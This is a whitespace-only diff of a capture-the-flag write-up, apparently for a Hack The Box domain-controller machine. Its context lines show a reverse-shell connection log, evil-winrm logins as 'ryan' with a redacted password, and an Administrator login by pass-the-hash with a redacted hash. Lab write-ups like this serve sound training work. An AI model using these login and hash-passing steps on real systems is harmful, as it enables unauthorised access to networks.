@@ -120,7 +120,7 @@ connect to [10.10.14.75] from (UNKNOWN) [10.10.11.51] 59840
 whoami
 sequel\sql_svc
 
-PS C:\Windows\system32>
+PS C:\Windows\system32>  
 ```
 
 Sadly this is not giving us our user flag yet, but indeed Ryan might be the one:
@@ -157,7 +157,7 @@ SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:<REDACTE
 $ evil-winrm -i 10.10.11.51 -u ryan -p '<REDACTED>'
 
 <SNIP>
-*Evil-WinRM* PS C:\Users\ryan\Documents>
+*Evil-WinRM* PS C:\Users\ryan\Documents>  
 ```
 
 ## Ryan started the fire!
@@ -303,7 +303,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 $ evil-winrm -i 10.10.11.51 -u Administrator -H '7<REDACTED>f'
 
 <SNIP>
-*Evil-WinRM* PS C:\Users\Administrator\Documents>
+*Evil-WinRM* PS C:\Users\Administrator\Documents>  
 ```
 
 ## Roll the credits
